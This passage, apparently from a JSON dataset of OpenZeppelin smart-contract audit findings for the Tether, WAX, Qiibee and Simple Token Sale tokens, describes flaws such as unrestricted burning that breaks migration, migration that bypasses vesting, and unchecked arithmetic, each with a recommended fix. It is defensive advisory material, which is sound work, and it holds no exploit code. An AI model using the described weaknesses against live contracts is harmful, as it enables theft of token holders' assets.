      "impact": "LOW",
      "content": "Current code specifies version pragma `^0.4.8` or `^0.4.9`, depending on the file. We recommend changing the solidity version pragma to the latest version (`^0.4.18`) to enforce the use of an up to date compiler. The new compiler [includes several bugfixes](https://etherscan.io/solcbuginfo), including `SkipEmptyStringLiteral`, to which the `0.4.9` compiled code is vulnerable.\n\n\nNote that this implies updating `constant` modifiers to `pure`/`view`, and updating `throw`s to `revert`/`require`/`assert` as needed.\n\n\n***Update**: Fixed in commit [`ce34f14d05`](https://github.com/tetherto/ether-contracts/tree/ce34f14d0590cb6bea2f3d33fe3f9584e4c72554/contracts).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Tether Token Audit",
      "source_link": "https://blog.openzeppelin.com/tether-token-audit-438d561a380/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11943",
      "title": "Token allowances can be modified while the contract is paused",
      "impact": "LOW",
      "content": "The method [`TetherToken#approve`](https://github.com/tetherto/ether-contracts/blob/9718de4da7b571c1acf822bfde1f5300d1acc381/contracts/TetherToken.sol#L63) is missing a `whenNotPaused` modifier. This allows any user to change allowances while the token is paused. A paused token should halt all state-changing operations, except for those to be run in emergency.  \n\nConsider adding the `whenNotPaused` modifier to the approve method, or simply using OpenZeppelin’s [`PausableToken`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.4.0/contracts/token/PausableToken.sol) contract, which integrates the Pausable functionality into a `StandardToken`.\n\n\n***Update**: Fixed in commit [`ce34f14d05`](https://github.com/tetherto/ether-contracts/tree/ce34f14d0590cb6bea2f3d33fe3f9584e4c72554/contracts).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Tether Token Audit",
      "source_link": "https://blog.openzeppelin.com/tether-token-audit-438d561a380/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11942",
      "title": "OpenZeppelin standard contracts were modified",
      "impact": "LOW",
      "content": "Additionally to copying OpenZeppelin’s contracts instead of installing them via NPM, some of them were modified.  \n\nFee management was added directly to [`BasicToken`](https://github.com/tetherto/ether-contracts/blob/9718de4da7b571c1acf822bfde1f5300d1acc381/contracts/zeppelin/token/BasicToken.sol) and [`StandardToken`](https://github.com/tetherto/ether-contracts/blob/9718de4da7b571c1acf822bfde1f5300d1acc381/contracts/zeppelin/token/StandardToken.sol) implementations, instead of implementing them in a new Token contract that extends from `StandardToken`.  \n\nWe concur with the original observations from Philip Daian in this point:\n\n\n\n> \n>  One change that would make the code substantially cleaner, more modular, and more upgradeable is the moving of the fee calculation functions to the top-level TetherToken file. Currently, the fee calculation is done independently twice in StandardToken.sol and BasicToken.sol. While the calculation has been verified and tested as working, this repetition of code minorly impacts the upgradeability of the token. Furthermore, modifications directly to the Zeppelin library violate the boundaries drawn in the application diagram in the previous section, potentially making future Zeppelin changes more difficult to integrate and more likely to introduce unintended side effects. While this change has been verified as not security critical, it is our belief that such a change would improve the readability, testability and modularity of the existing codebase.\n> \n> \n> \n\n\nFurthermore, non ERC20-compliant changes, such as using `MAX_UINT` as an [eternal approval](https://github.com/tetherto/ether-contracts/blob/9718de4da7b571c1acf822bfde1f5300d1acc381/contracts/zeppelin/token/StandardToken.sol#L37) magic value, or forcing clients to [reduce approval to zero](https://github.com/tetherto/ether-contracts/blob/9718de4da7b571c1acf822bfde1f5300d1acc381/contracts/zeppelin/token/StandardToken.sol#L61) before changing it, were introduced in the StandardToken implementation. Note that, since 1.3.0, OpenZeppelin’s StandardToken has the [`increaseApproval](https://github.com/OpenZeppelin/zeppelin-solidity/pull/224) and [`decreaseApproval](https://github.com/OpenZeppelin/zeppelin-solidity/pull/224) methods to mitigate the latter.\n\n\nThis is not the way OpenZeppelin standard contracts should be used. Making changes to open-source libraries, instead of using them as is, can be dangerous and prevents from integrating bug-fixes into the codebase easily.  \n\nConsider extending `StandardToken` in a `StandardTokenWithFees` contract, that adds the fee calculation feature to the token.\n\n\n***Update**: Fixed in commits [`ce34f14d05`](https://github.com/tetherto/ether-contracts/tree/ce34f14d0590cb6bea2f3d33fe3f9584e4c72554/contracts) and [`0e2e2ddda1`](https://github.com/tetherto/ether-contracts/tree/0e2e2ddda17ed4ed20c1d89015906d8276fb38ba/contracts).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Tether Token Audit",
      "source_link": "https://blog.openzeppelin.com/tether-token-audit-438d561a380/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11941",
      "title": "Install OpenZeppelin via NPM and Update",
      "impact": "MEDIUM",
      "content": "`Contactable`, `Pausable`, `SafeMath`, `Ownable`, `ERC20Basic`, `ERC20`, `BasicToken`, and `StandardToken` were [copied](https://github.com/tetherto/ether-contracts/tree/9718de4da7b571c1acf822bfde1f5300d1acc381/contracts/zeppelin) from the OpenZeppelin repository.\n\n\nThis violates OpenZeppelin’s MIT license, which requires the license and copyright notice to be included if its code is used, and makes it difficult and error-prone to update to a more recent version.\n\n\nMoreover, the contracts were copied from an old unspecified version (earlier than June 2017, based on the [Solidity version pragma](https://github.com/OpenZeppelin/zeppelin-solidity/commit/6ede3d9001dcb07e35a38333cb7d6d10bb1a77f8)). Since then, there have been multiple fixes to the included contracts, which are missing from the Tether repository.  \n\nSome of these fixes include:\n\n\n* Fire an event to signal Ownership transfer (see [PR424](https://github.com/OpenZeppelin/zeppelin-solidity/pull/424))\n* Remove incorrect short address attack checks (see [PR277](https://github.com/OpenZeppelin/zeppelin-solidity/pull/277))\n* Check that destination of token transfers is not 0x0 (see [PR415](https://github.com/OpenZeppelin/zeppelin-solidity/pull/415))\n* Add boolean return flags to ERC20 methods to conform to the standard (see [PR308](https://github.com/OpenZeppelin/zeppelin-solidity/pull/308))\n* Use `require` checks for token preconditions (see [PR466](https://github.com/OpenZeppelin/zeppelin-solidity/pull/466))\n* A user can send to themselves more than their current balance (see [PR377](https://github.com/OpenZeppelin/zeppelin-solidity/pull/377))\n\n\nConsider following the [recommended way](https://github.com/OpenZeppelin/zeppelin-solidity#getting-started) to use OpenZeppelin contracts, which is via the [zeppelin-solidity NPM package](https://www.npmjs.com/package/zeppelin-solidity), and update to the latest version (1.4.0 at the time of this writing). This allows for any bugfixes to be easily integrated into the codebase.\n\n\n***Update**: OpenZeppelin version 1.4.0 is imported via NPM as of commit [`ce34f14d05`](https://github.com/tetherto/ether-contracts/tree/ce34f14d0590cb6bea2f3d33fe3f9584e4c72554/contracts). However, due to [this issue](https://github.com/OpenZeppelin/zeppelin-solidity/issues/434) in the library, a change is needed in the `StandardToken` contract as described in the [README](https://github.com/tetherto/ether-contracts/blob/ce34f14d0590cb6bea2f3d33fe3f9584e4c72554/README.md). Instead of requiring the developer to manually perform the change, consider forking the library in GitHub and changing it there, or commit a [patch diff file](https://git-scm.com/docs/git-apply) to automate the change.*",
      "summary": "\nThis bug report is about the Tether repository copying code from the OpenZeppelin repository without following the MIT license. This license requires the license and copyright notice to be included if its code is used. Moreover, the code was copied from an old unspecified version, which means that any fixes made to the included contracts since then are missing from the Tether repository. This can potentially lead to security issues.\n\nThe report suggests that the Tether repository should follow the recommended way to use OpenZeppelin contracts, which is via the zeppelin-solidity NPM package, and update to the latest version (1.4.0 at the time of this writing). This will allow for any bugfixes to be easily integrated into the codebase.\n\nHowever, there is an issue with the library in version 1.4.0, so the report recommends forking the library in GitHub and changing it there, or committing a patch diff file to automate the change.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Tether Token Audit",
      "source_link": "https://blog.openzeppelin.com/tether-token-audit-438d561a380/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11955",
      "title": "Token allowances may be increased or decreased when paused",
      "impact": "LOW",
      "content": "The `StandardToken` contract defines an [`increaseApproval`](https://github.com/waxio/wax-erc20-delivery-contract/blob/6c7098dd2522630d74c9600f678b3b28d58fa9aa/contracts/zeppelin-solidity/contracts/token/StandardToken.sol#L71) and [`decreaseApproval`](https://github.com/waxio/wax-erc20-delivery-contract/blob/6c7098dd2522630d74c9600f678b3b28d58fa9aa/contracts/zeppelin-solidity/contracts/token/StandardToken.sol#L77) methods that could be called and executed even when the `WaxToken` contract is paused.\n\n\nConsider overriding in [`WaxToken`](https://github.com/waxio/wax-erc20-delivery-contract/blob/6c7098dd2522630d74c9600f678b3b28d58fa9aa/contracts/WaxToken.sol) the `increaseApproval` and `decreaseApproval` methods of the OpenZeppelin `StandardToken` contract, adding the `whenNotPaused` modifier.\n\n\nNotice that this is already implemented in OpenZeppelin as [`PausableToken`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.4.0/contracts/token/PausableToken.sol). Consider using it instead.\n\n\n***Update:** Fixed as suggested in [`fb1d356`](https://github.com/waxio/wax-erc20-delivery-contract/commit/fb1d356006f5ffc988debc58fb830b1c145e1289).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WAX Token Audit",
      "source_link": "https://blog.openzeppelin.com/wax-token-audit-e072e580407e/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11954",
      "title": "OpenZeppelin standard contracts were modified",
      "impact": "LOW",
      "content": "Additionally to copying OpenZeppelin’s contracts instead of installing them via NPM, some of them were modified.\n\n\nThe contract `BasicToken` was modified to add a state variable [`contractAddress`](https://github.com/waxio/wax-erc20-delivery-contract/blob/6c7098dd2522630d74c9600f678b3b28d58fa9aa/contracts/zeppelin-solidity/contracts/token/BasicToken.sol#L14), and the functions [`transfer`](https://github.com/waxio/wax-erc20-delivery-contract/blob/6c7098dd2522630d74c9600f678b3b28d58fa9aa/contracts/zeppelin-solidity/contracts/token/BasicToken.sol#L23), and [`transferFrom`](https://github.com/waxio/wax-erc20-delivery-contract/blob/6c7098dd2522630d74c9600f678b3b28d58fa9aa/contracts/zeppelin-solidity/contracts/token/StandardToken.sol#L26) in `StandardToken` were modified to require that the receiver of tokens is not the `WaxToken` contract itself.\n\n\nThis is not the way OpenZeppelin standard contracts should be used. Making changes to open-source libraries, instead of using them as is, can be dangerous and won’t allow you to integrate bug-fixes into the codebase easily.\n\n\nAdd these additional preconditions to the `WaxToken` contract, instead of OpenZeppelin’s contracts. For example, [override the `transfer` function](https://github.com/waxio/wax-erc20-delivery-contract/blob/6c7098dd2522630d74c9600f678b3b28d58fa9aa/contracts/WaxToken.sol#L50) adding the additional restriction and call `super.transfer(…)` within it. (Note: this has actually already been done, so it’s a matter of removing the modifications to OpenZeppelin’s contracts.)\n\n\n***Update:** Fixed in [`57d8603`](https://github.com/waxio/wax-erc20-delivery-contract/commit/57d8603638d813da17fb725374749e9d9f38b8dc).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WAX Token Audit",
      "source_link": "https://blog.openzeppelin.com/wax-token-audit-e072e580407e/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11953",
      "title": "Install OpenZeppelin via NPM",
      "impact": "LOW",
      "content": "`Pausable`, `SafeMath`, `Ownable`, `ERC20Basic`, `ERC20`, `BasicToken`, and `StandardToken` were [copied](https://github.com/waxio/wax-erc20-delivery-contract/tree/6c7098dd2522630d74c9600f678b3b28d58fa9aa/contracts/zeppelin-solidity/contracts) from the OpenZeppelin repository. Moreover, they appear to have been copied from the `master` branch, instead of the release. This violates OpenZeppelin’s MIT license, which requires the license and copyright notice to be included if its code is used, and makes it difficult and error-prone to update to a more recent version.\n\n\nConsider following the [recommended way](https://github.com/OpenZeppelin/zeppelin-solidity#getting-started) to use OpenZeppelin contracts, which is via the [zeppelin-solidity NPM package](https://www.npmjs.com/package/zeppelin-solidity). This allows for any bugfixes to be easily integrated into the codebase.\n\n\n***Update:** Impoted OpenZeppelin as NPM dependency in [`57d8603`](https://github.com/waxio/wax-erc20-delivery-contract/commit/57d8603638d813da17fb725374749e9d9f38b8dc).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "WAX Token Audit",
      "source_link": "https://blog.openzeppelin.com/wax-token-audit-e072e580407e/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11952",
      "title": "Missing full sanity checks on adding accredited investors",
      "impact": "LOW",
      "content": "It is possible to `addAccreditedInvestor` with `minInvest` being greater than `maxCumulativeInvest`. Although this configuration will be recorded properly, it will throw an exception on [line 92](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeePresale.sol#L92) of the `buyTokens` function, therefore preventing the investor to take a part into the sale.\n\n\nWe recommend adding an extra precondition `require( minInvest &lt;= maxCumulativeInvest)` in [line 119](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeePresale.sol#L119) so any potential errors are detected as early as possible.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee Token Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11951",
      "title": "Validate MigrationAgent setting",
      "impact": "LOW",
      "content": "The [`setMigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L100) function from [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) does not check if the `agent.qbxSourceToken` matches the address of the contract from which the function is executed. Linking to a `MigrationAgent` that was configured to work with a different token may corrupt the migration process.\n\n\nWe recommend checking the precondition `require(_agent.qbxSourceToken == address(this))` in [line 102](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L102) to avoid being in an inconsistent state.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee Token Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11950",
      "title": "Vesting logic implemented directly in the token contract",
      "impact": "LOW",
      "content": "The vesting logic is currently implemented in the `QiibeeToken` in the form of a base `VestedToken` contract. These features are going to be used by a limited number of buyers and for a restricted amount of time only. Having complex logic included directly in the token contract may not only cause compatibility issues with blockchain explorers and exchanges, but it may also increase the potential attack surface.\n\n\nWe would suggest extracting the vesting logic into a separate contract as implemented in the OpenZeppelin [pull request](https://github.com/OpenZeppelin/zeppelin-solidity/issues/274).\n\n\n***Update:** The Qiibee team explained, that because of legal matters, they prefer to keep both functionalities within a single contract that controls token issuance.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee Token Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11949",
      "title": "Constant names incompatible with the ERC20 standard",
      "impact": "MEDIUM",
      "content": "[`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol) declares the obligatory [`ERC20`](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md) standard parameters as uppercase constants: [`SYMBOL`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol#L19), [`NAME`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol#L21), [`DECIMALS`](https://github.com/qiibee/qb-contracts/blob/26d5963491c26a56938c723a342b666d3b478ea7/contracts/QiibeeToken.sol#L23). This conflicts with the official specification that requires the names to be lowercase: `symbol`, `name`, `decimals`.\n\n\nConsider renaming constants to lowercase, so they are compliant with the official [`ERC20`](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md) standard.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "\nQiibeeToken is a contract that follows the ERC20 standard, which is a standard for tokens on the Ethereum blockchain. The QiibeeToken contract declares the necessary parameters for the ERC20 standard as uppercase constants, however, the official specification requires the names to be in lowercase. This bug report suggests that the constants should be renamed to lowercase, so they are compliant with the official ERC20 standard. The bug has since been fixed in a commit, making the QiibeeToken contract compliant with the ERC20 standard.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee Token Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11948",
      "title": "Unchecked math operations",
      "impact": "MEDIUM",
      "content": "There are three unchecked math operations inside the migration function in lines [114](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L114)–[116](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L116) . It’s always better to be safe and perform operations with correctness assertions.\n\n\nConsider rigorously checking for under and overflows for all of the arithmetic operations. We recommend using the [`SafeMath`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/1a1e863441ba0149d7585203f5dbc6e800af00cf/contracts/SafeMath.sol) library from OpenZeppelin.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit.*",
      "summary": "\nThis bug report is about an issue found in the migration function of the QiibeeToken.sol file, located on lines 114-116. The issue is that there are three unchecked math operations in the function, which could lead to incorrect results, or even under/overflows. To fix this issue, the OpenZeppelin SafeMath library should be used, which provides a set of math operations that are rigorously checked for under/overflows. The bug has now been fixed in the 25efdbf5bc29de12a724450c540218f6c8e59129 commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee Token Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11947",
      "title": "Token minting is not synchronized with MigrationAgent",
      "impact": "HIGH",
      "content": "Token minting leads to an inconsistent state as the `MigrationAgent` [tokenSupply](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) is never increased after being set in the constructor. The discrepancy between the [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) and the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) states, breaks the [`safetyInvariantCheck`](http://safetyInvariantCheck) and corrupts the migration process.\n\n\nWe suggest enforcing that the token has finalized the minitingby adding the check `require(_qbxSourceToken.mintingFinished)` in [line 21](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) of the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol). If the team wants to continue the minting after the migration is deployed we recommend increasing the `tokenSupply` by the amount of newly created tokens.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit by tracking [`newTokens`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/QiibeeToken.sol#L139) and updating the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol) state in the [`updateSupply`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol#L57) function.*",
      "summary": "\nThis bug report is about an inconsistency between the token supply in the QiibeeToken and MigrationAgent contracts. The issue is that the tokenSupply of the MigrationAgent is never increased after being set in the constructor, leading to a discrepancy between the two contracts. This breaks the safetyInvariantCheck and corrupts the migration process.\n\nTo fix this issue, a check was added to the MigrationAgent contract that the token has finalized minting. Additionally, if the team wants to continue minting after the migration is deployed, the tokenSupply must be increased by the amount of newly created tokens. This was fixed in a commit by tracking newTokens and updating the MigrationAgent state in the updateSupply function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee Token Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11946",
      "title": "Migration bypasses vesting restrictions",
      "impact": "HIGH",
      "content": "All of the users are allowed to [`migrate`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L109) their tokens to a new contract regardless of whether their assets are fully transferable or locked in a vesting scheme. Moreover, once they migrate the tokens any vesting restrictions are removed.\n\n\nWe recommend only allowing `transferableTokens` to be available for migrations. An alternative solution is to implement a new `migateVestedTokens` function that will copy the vesting configuration to the migration target contract.\n\n\n***Update:** Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit by [checking](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/QiibeeToken.sol#L120) if the amount of tokens is within the `transferableTokens` limit at the moment of migration.*",
      "summary": "\nThis bug report is about the Qiibee Token contract, which allows all users to migrate their tokens to a new contract regardless of whether their assets are fully transferable or locked in a vesting scheme. This can cause issues since any vesting restrictions are removed during the migration process. \n\nThe recommended solution is to only allow transferable tokens to be available for migrations. An alternative solution is to create a new migrateVestedTokens function that will copy the vesting configuration to the migration target contract. \n\nThe bug has been fixed in a commit by checking if the amount of tokens is within the transferableTokens limit at the moment of migration.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee Token Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11945",
      "title": "Tokens burning breaks MigrationAgent contract",
      "impact": "HIGH",
      "content": "Tokens burning after the deployment of the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) creates a discrepancy between `tokenSupply` defined in the token and the migration contract, which will irreversibly break the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol). Once the `MigrationAgent` contract is deployed, it defines [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) to match the current state of `qbxSourceToken`. However, when the supply of the source token decreases after burning, the [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) variable is not updated causing invariants checks to fail. [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) may be corrupted by any token holder as the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function is not restricted.\n\n\nConsider restricting the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function solely to the [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) owner. If this solution cannot be implemented, we suggest updating [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) variable of after every [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) operation as an alternative.\n\n\n***Update**: Fixed in [this](https://github.com/qiibee/qb-contracts/commit/25efdbf5bc29de12a724450c540218f6c8e59129) commit by both restricting the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/QiibeeToken.sol#L174) function and counting the `burntTokens`, so the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol) can [`updateSupply`](https://github.com/qiibee/qb-contracts/blob/25efdbf5bc29de12a724450c540218f6c8e59129/contracts/MigrationAgent.sol#L57).*",
      "summary": "\nThis bug report is about an issue that occurs when the [`MigrationAgent`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol) contract is deployed. The issue is that when tokens are burned, the `tokenSupply` defined in the token and the migration contract are not updated, causing invariants checks to fail. This can be exploited by any token holder as the access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function is not restricted.\n\nThe suggested solution to this issue is to either restrict access to the [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) function solely to the [`QiibeeToken`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol) owner or to update the [`tokenSupply`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/MigrationAgent.sol#L21) variable after every [`burn`](https://github.com/qiibee/qb-contracts/blob/d40368c9a7a536572a5bb03cb031d658ccb34f24/contracts/QiibeeToken.sol#L134) operation. The issue has been resolved by restricting access to the [`burn`](https://github.com/qiibee/qb-contracts/blob",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Qiibee Token Audit",
      "source_link": "https://blog.openzeppelin.com/qiibee-token-audit-b19c03262f99/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11963",
      "title": "Imprecise unlock date documentation",
      "impact": "LOW",
      "content": "The definition of [`unlockDate`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/master/contracts/ERC20Interface.sol) from [`FutureTokenSaleLockBox`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/66025fede245a382ef6ed9f32dd0ecd1da34301f/contracts/FutureTokenSaleLockBox.sol#L45) contract (The unlock date is initially six months after [`26 weeks`](https://github.com/OpenSTFoundation/SimpleTokenSale/blob/66025fede245a382ef6ed9f32dd0ecd1da34301f/contracts/FutureTokenSaleLockBox.sol#L68). The difference is dependent on an exact `unlockDate` and requires complex calendar logic to be precisely calculated.\n\n\nWe recommend documenting the periods in fixed time units such as days or weeks.\n\n\n**Update**: *Fixed in [this](https://github.com/OpenSTFoundation/SimpleTokenSale/commit/d5fc588668191b9ae506fd34d986139489e88afc#diff-b89ee3991a421f1a54a3c54854555e42R37) commit.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Simple Token Sale Audit",
      "source_link": "https://blog.openzeppelin.com/simple-token-sale-audit-30e5f2365463/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11962",
      "title": "Duplicated logic in mock contracts",
      "impact": "LOW",
